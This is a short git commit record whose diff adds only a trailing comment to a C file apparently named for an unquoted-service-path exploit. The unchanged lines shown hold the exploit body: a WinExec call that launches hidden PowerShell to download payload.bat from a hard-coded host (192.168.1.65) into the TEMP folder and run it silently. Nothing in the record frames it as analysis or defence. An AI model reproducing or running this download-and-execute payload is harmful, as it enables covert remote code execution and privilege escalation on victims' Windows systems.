a167d5dbaae1bedb2925bb337b62c4d870d66a75
d3hvck <106494573+d3hvck@users.noreply.github.com>
2025-04-15 05:21:45 +0400

    Update Exp_UnquotedPath.c

--- Exp_UnquotedPath.c
+++ Exp_UnquotedPath.c
@@ -4,3 +4,5 @@ int main() {
     WinExec("cmd.exe /c powershell -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://192.168.1.65/payload.bat' -OutFile $env:TEMP\\payload.bat; Start-Process cmd.exe -ArgumentList '/c $env:TEMP\\payload.bat' -WindowStyle Hidden\"", SW_HIDE);
     return 0;
 }
+
+//Neet Optimization
